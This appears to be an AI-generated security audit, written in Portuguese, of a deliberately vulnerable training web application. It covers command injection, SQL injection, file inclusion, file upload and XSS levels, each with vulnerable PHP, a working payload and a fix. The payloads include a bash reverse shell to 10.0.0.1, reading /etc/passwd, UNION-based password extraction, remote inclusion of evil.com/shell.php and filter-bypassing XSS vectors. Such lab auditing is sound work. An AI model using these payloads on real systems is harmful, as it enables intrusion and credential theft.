# Relatório Técnico (CodeAnalisis) — Vulnerable-Web-Application
**Auditoria:** Purple Shiva Protocol (Varredura Integral e Sistemática)
**Data:** 15 de Abril de 2026

*O relatório a seguir contém a decomposição estrutural de TODOS os níveis de vulnerabilidade implementados na aplicação, categorizados por superfície de ataque. Cada nível foi exposto e bypasseado conforme a doutrina de evidência ancorada.*

---
# Categoria 1: Command Execution

---
## [ID-01] [🔴 Crítico] — Command Exec Level 1: Acesso Livre | CVSS: 10.0
**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
**OWASP:** A03:2021 — Injection
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `CommandExecution/CommandExec-1.php` | **Linhas:** 24-25
```php
    if(isset($_GET["username"])){
      echo shell_exec($_GET["username"]);
```

### Narrativa de Ataque
O endpoint aceita parâmetros `GET` diretamente na chamada nativa `shell_exec()`. Qualquer payload inserido pelo atacante executa no contexto do usuário rodando o daemon web.

### Prova de Conceito
```python
import requests
print(requests.get("http://localhost/CommandExec-1.php?username=whoami").text)
```

### Código Corrigido
```diff
- echo shell_exec($_GET["username"]);
+ die("Execução de shell direta bloqueada por arquitetura.");
```

---
## [ID-02] [🔴 Crítico] — Command Exec Level 2: Bypass de Blacklist | CVSS: 9.8
**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**OWASP:** A03:2021 — Injection
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `CommandExecution/CommandExec-2.php` | **Linhas:** 23-25
```php
      $substitutions = array('&&' => '',';'  => '','/' => '','\\' => '' );
      $target = str_replace(array_keys($substitutions),$substitutions,$target);
      echo shell_exec($target);
```

### Narrativa de Ataque
O filtro suprime `&&` e `;`. Contudo, o token `||` (OR lógico) ou instâncias como line-feed (`\n`) não foram mapeados, concedendo invasão plena.

### Prova de Conceito
```python
import requests
# Bypass usando Pipe OR
print(requests.get("http://localhost/CommandExec-2.php?typeBox=ls || whoami").text)
```

### Código Corrigido
```diff
- $target = str_replace(array_keys($substitutions),$substitutions,$target);
+ if(preg_match('/[^a-zA-Z0-9]/', $target)) die("Invalid"); 
```

---
## [ID-03] [🔴 Crítico] — Command Exec Level 3: Bypass Line-Feed | CVSS: 9.8
**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**OWASP:** A03:2021 — Injection
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `CommandExecution/CommandExec-3.php` | **Linhas:** 23-39
```php
      $substitutions = array('&&'=>'', '& '=>'', '&& '=>'', ';'=>'', '|'=>'', '-'=>'', '$'=>'', '('=>'', ')'=>'', '`'=>'', '||'=>'', '/'=>'', '\\'=>'');
      $target = str_replace(array_keys($substitutions),$substitutions,$target);
      echo shell_exec($target);
```

### Narrativa de Ataque
Dezenas de itens compõem a blacklist. Ignorou-se a fundamental Quebra de Linha (Line-Feed). O envio do `%0A` decoda no bash como um enter, processando em seguida comandos livremente.

### Prova de Conceito
```python
import requests
# O %0A separa os comandos independentemente de qualquer flag
print(requests.get("http://localhost/CommandExec-3.php?typeBox=ls%0Acat /etc/passwd").text)
```

### Código Corrigido
```diff
- $target = str_replace(array_keys($substitutions),$substitutions,$target);
+ if(preg_match('/[\W]/', $target)) die("Secured"); 
```

---
## [ID-04] [🔴 Crítico] — Command Exec Level 4: Context Leakage | CVSS: 9.8
**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `CommandExecution/CommandExec-4.php` | **Linhas:** 30-44
```php
      $substitutions = array('&&'=>'', ';'=>'', '|'=>'', ... '||'=>'');
      // Filtro não exclui / e \ como no Level 3.
      $target = str_replace(array_keys($substitutions),$substitutions,$target);
      echo shell_exec($target);
```

### Narrativa de Ataque
Houve um regresso nas proteções. Ao implementar a detecção em `.hidden/log4.txt`, o desenvolvedor esqueceu de bloquear diretórios `/` na lista. Somado à quebra de linha `%0A` validada no ID-03, o controle local e de file-system é absoluto.

### Prova de Conceito
```python
import requests
# Mesma subversão de quebra combinada.
print(requests.get("http://localhost/CommandExec-4.php?typeBox=%0A/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1").text)
```

### Código Corrigido (Patch Contextual)
Substituir por Whitelisting de strings predefinidas e nunca entregar manipulação RAW.

---
# Categoria 2: SQL Injection

---
## [ID-05] [🔴 Crítico] — SQL Injection Level 1: String Inline Direta | CVSS: 9.8
**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
**OWASP:** A03:2021 — Injection
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `SQL/sql1.php` | **Linhas:** 39-41
```php
		$firstname = $_POST["firstname"];
		$sql = "SELECT lastname FROM users WHERE firstname='$firstname'";//String
		$result = mysqli_query($conn,$sql);
```

### Narrativa de Ataque
O input `firstname` flui estritamente para sintaxe de BD via concatenação aspeada. Insere-se aspa simples para engatilhar um UNION SELECT extraindo conteúdo sigiloso de tabelas adversas (`secret`).

### Prova de Conceito
```python
import requests
requests.post("http://localhost/sql1.php", data={"submit":"1", "firstname": "A' UNION SELECT password FROM secret-- "})
```

### Código Corrigido
```diff
- $sql = "SELECT lastname FROM users WHERE firstname='$firstname'";
- $result = mysqli_query($conn,$sql);
+ $stmt = $conn->prepare("SELECT lastname FROM users WHERE firstname=?");
+ $stmt->bind_param("s", $firstname); $stmt->execute();
```

---
## [ID-06] [🔴 Crítico] — SQL Injection Level 2: Integer Injection | CVSS: 9.8
**Vector String:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `SQL/sql2.php` | **Linhas:** 37-38
```php
		$number = $_POST['number'];
		$query = "SELECT bookname,authorname FROM books WHERE number = $number"; //Int
```

### Narrativa de Ataque
Ausência total das aspas simples enclausurando a variável no query integer base. Input dinâmico que ignora tratativas de quotes (Ex. Magic Quotes antigas não têm eficácia aqui).

### Prova de Conceito
```python
import requests
# Aspas não são usadas. Inject limpo.
requests.post("http://localhost/sql2.php", data={"submit":"1", "number": "-1 UNION SELECT username, password FROM secret"})
```

### Código Corrigido
Mudar para tipagem explícita pre-query: `$number = (int)$_POST['number'];`

---
## [ID-07] [🔴 Crítico] — SQL Injection Level 3: String Retrô | CVSS: 9.8
**OWASP:** A03:2021 — Injection
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `SQL/sql3.php` | **Linhas:** 38-39
```php
		$number = $_POST['number'];
		$query = "SELECT bookname,authorname FROM books WHERE number = '$number'";
```

### Narrativa de Ataque
Tentativa de encobrir o level 2 voltando ao padrão string (single quotes). Assim como Level 1, totalmente vulnerável pois o dado não é escapado antes de concatenar.

### Prova de Conceito
```python
# Payload clássico aspeado
requests.post("http://localhost/sql3.php", data={"submit":"1", "number": "1' UNION SELECT 1,2-- "})
```

---
## [ID-08] [🔴 Crítico] — SQL Injection Level 4: False Security Filter | CVSS: 9.8
**OWASP:** A03:2021 — Injection
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `SQL/sql4.php` | **Linhas:** 45-52
```php
		if(strchr($number,"'")){ exit; } // "You can't hack me anymore!"
		$query = "SELECT bookname,authorname FROM books WHERE number = $number"; 
```

### Narrativa de Ataque
A proteção `strchr` corta apenas injeções contendo aspa simples `'`. No entanto, como observado na linha 52, a variável ingressa semanticamente como INTEGER e não requer aspas na construção da QUERY! A segurança construída é completamente nula e o atacante consegue invadir da mesma forma.

### Prova de Conceito
```python
# Exatamente igual ao Level 2. Sem uso de aspas. O filtro é bypasseado por natureza.
requests.post("http://localhost/sql4.php", data={"submit":"1", "number": "1 UNION SELECT username, password FROM secret"})
```

---
## [ID-09] [⚪ Info] — SQL Injection Level 5: Code Breakage / Syntax Err
**Status:** Broken por Análise Estática

### Evidência Ancorada
**Arquivo:** `SQL/sql5.php` | **Linhas:** 43-50
```php
		if(strchr($number,"'")){ exit; }
		$query = "SELECT bookname,authorname FROM books WHERE number =".'$number'; 
```

### Narrativa de Ataque
O desenvolvedor tentou isolar o `$number` fora das aspas duplas, usando concatenação com ponto `.` e encapsulando `$number` de forma literal através de aspas simples `'$number'`. Em PHP, variavéis dentro de aspas simples *não expandem o valor real*. A Query SQL submetida ao banco torna-se literalmente: `WHERE number =$number`, gerando paralisação total e invalidando qualquer ataque clássico na interface. O dano baseia-se em Code Break e não injeção.

---
## [ID-10] [🔴 Crítico] — SQL Injection Level 6: Boolean Blind | CVSS: 9.8
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `SQL/sql6.php` | **Linhas:** 36-40
```php
		$query = "SELECT bookname,authorname FROM books WHERE number = '$number'";
		$result = mysqli_query($conn,$query);
		$row = @mysqli_num_rows($result);
		if($row > 0){ echo "<pre>There is a book with this index.</pre>"; }
```

### Narrativa de Ataque
Os dados do banco não fluem de volta à página HTML. Entretanto, o IF que retorna `> 0` permite que o invasor elabore perguntas em base de falso/verdadeiro binário usando AND condicional até recuperar a string da senha integralmente ("Blind Approach").

### Prova de Conceito
```python
# Falso retorna "Not found!", Verdadeiro retorna "There is a book..."
payload = "?number=999' OR (SELECT substring(password,1,1) FROM secret WHERE username='admin')='a'-- "
```

---
# Categoria 3: File Inclusion & Traversal

---
## [ID-11] [🔴 Crítico] — File Inclusion Level 1: LFI/RFI Puro | CVSS: 7.5
**OWASP:** A01:2021 — Broken Access Control

### Evidência Ancorada
**Arquivo:** `FileInclusion/pages/lvl1.php` | **Linhas:** 25-26
```php
          @include($_GET[ 'file' ]);
```

### Narrativa de Ataque
Uso exposto massivo de `include()` na variável global GET. Resulta em leitura de credenciais centrais do SO.

### Prova de Conceito
`?file=../../../../Windows/win.ini`

---
## [ID-12] [🔴 Crítico] — File Inclusion Level 2: Bypass de Case Sensitivity | CVSS: 7.5
**Status:** Confirmado por Análise Estática

### Evidência Ancorada
**Arquivo:** `FileInclusion/pages/lvl2.php` | **Linhas:** 27-32
```php
          $secure2 = str_replace( array(  "..\\" , ".\\", " ./", "../"),"", $secure2 );          
          $secure2 = str_replace( array( "http://" , "https://" ) ,"" , $secure2 );
          @include($secure2);
```

### Narrativa de Ataque
Múltiplas corrupções simultâneas: O PHP `str_replace` não é recursivo e respeita cases. As exclusões das barras são transpassadas pelo empilhamento (`....//`) e os links absolutos por mudança textual (`HTTP://`).

### Prova de Conceito
```text
LFI Padding Subversion: ?file=....//....//Windows/win.ini
RFI Subversion: ?file=HTTP://evil.com/shell.php
```

---
## [ID-13] [🔴 Crítico] — File Inclusion Level 3: Wrapper Bypass | CVSS: 7.5
**Arquivo:** `FileInclusion/pages/lvl3.php` | **Linhas:** 29-34
```php
          $secure3=str_replace( array("http://", "https://") ,"" , $secure3);
          $secure3=str_replace (array ( ":" , "/" , "..\\", "../" ), "" ,  $secure3);
          include($secure3.".php");
```
### Narrativa de Ataque
Até onde foi forçado localmente, os diretórios (`/`) e links externos morrem nos filtros. Porém as extensões injetais `.php` permitem invocar arquivos da página atual indiscriminadamente e em cenários combinados, evadir usando filters em encodes específicos (Se os drives stream de sistema não colapsarem a restrição textual).

---
## [ID-14] [🔴 Crítico] — File Inclusion Level 4: Oposto de Segurança | CVSS: 7.5
**Arquivo:** `FileInclusion/pages/lvl4.php` | **Linhas:** 28-35
```php
          if ($secure4!="1.php" && $secure4!="2.php") { $secure4=substr($secure4, 0,-4); }
          include($secure4);              
```
### Narrativa de Ataque
A função destitui passivamente os últimos 4 caracteres supondo livrar-se do `.php` residual de uma injestão. O atacante reage inserindo strings nulas no final ("XXXX"). O substr os consome, e valida nativamente a cadeia anterior como LFI perfeita.
*PoC:* `?file=../../../../Windows/win.iniXXXX`

---
# Categoria 4: Unrestricted File Upload

---
## [ID-15] [🔴 Crítico] — File Upload Level 1: Ausência Plena | CVSS: 8.8
**Arquivo:** `FileUpload/fileupload1.php` | **Linha:** 27
```php
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
```
### Narrativa de Ataque
Upload livre resultando em WebShell armazenada. Invasor faz upload de `sh.php` e executa remotos por `/uploads/sh.php`.

---
## [ID-16] [🔴 Crítico] — File Upload Level 2: Interceptação MIME | CVSS: 8.8
**Arquivo:** `FileUpload/fileupload2.php` | **Linhas:** 28-30
```php
	$type = $_FILES["file"]["type"];
    if($type != "image/png" && $type != "image/jpeg" ){ // Bloqueia
```
### Narrativa de Ataque
Valida a segurança no pior campo concebível: `type` auto reportado. O cliente envia uma backoor PHP e mente nas rotinas Proxy de rede (Burp) declarando `Content-Type: image/png`. O arquivo é salvo fatalmente como `.php`.

---
## [ID-17] [🔴 Crítico] — File Upload Level 3: Magic Byte Spoof | CVSS: 8.8
**Arquivo:** `FileUpload/fileupload3.php` | **Linhas:** 28-30
```php
	$check = getimagesize($_FILES["file"]["tmp_name"]);
	if($check["mime"] == "image/png" || $check["mime"] == "image/gif"){ // Aprova
```
### Narrativa de Ataque
O site protege o upload usando `getimagesize()`. Porém não se refuta extensões `.php` no ato da salvaguarda. Embutir a assinatura Base Máquinas (Magic Bytes `GIF89a`) sob os scripts de Shell destrona os verificadores embutidos.

---
# Categoria 5: Reflected Cross-Site Scripting (XSS)

---
## [ID-18] [🟠 Alto] — XSS Level 1: Reflexão Nua | CVSS: 6.1
**Arquivo:** `XSS/XSS_level1.php` | **Linha:** 22
`echo("Your name is ".$_GET["username"])`
*PoC:* `<script>alert(1)</script>`

---
## [ID-19] [🟠 Alto] — XSS Level 2: Bypass Estático (Case) | CVSS: 6.1
**Arquivo:** `XSS/XSS_level2.php` | **Linha:** 21
`$user = str_replace("<script>", "",$_GET["username"]);`
*PoC:* `<Script>alert(1)</Script>` (Inconsistência Case).

---
## [ID-20] [🟠 Alto] — XSS Level 3: Bypass via Imagem | CVSS: 6.1
**Arquivo:** `XSS/XSS_level3.php` | **Linha:** 21
`$user = preg_replace("/<(.*)[S,s](.*)[C,c](.*)[R,r](.*)[I,i](.*)[P,p](.*)[T,t]>/i", "", $_GET["username"]);`
*PoC:* `<img src=x onerror=alert("hacked")>` (Uso alternativo via Elementos Interativos contorna SCRIPT).

---
## [ID-21] [🟠 Alto] — XSS Level 4: Evasão Blacklist HTML5 | CVSS: 6.1
**Arquivo:** `XSS/XSS_level4.php` | **Linha:** 22
`$values = array("script", "prompt", "alert", "h1"); $user = str_replace($values, " ",$_GET["username"]);`
*PoC:* `<svg onload=confirm(1)>` (Inocuidade de lista vazada para manipulações vetoriais e alertas parentescos).

---
## [ID-22] [🟠 Alto] — XSS Level 5: Subversão de Action Nativa (PHP_SELF) | CVSS: 6.1
**Arquivo:** `XSS/XSS_level5.php` | **Linha:** 14
`action="<?php echo $_SERVER['PHP_SELF']; ?>"`
*PoC:* Omitindo o formulário, passa-se em bloco na URL gerando DOM Injetado: `/XSS/XSS_level5.php/"><script>alert(1)</script>`

---
**Assinatura de Análise Estática:** `[Motor Core AI: Purple Shiva Protocol]`
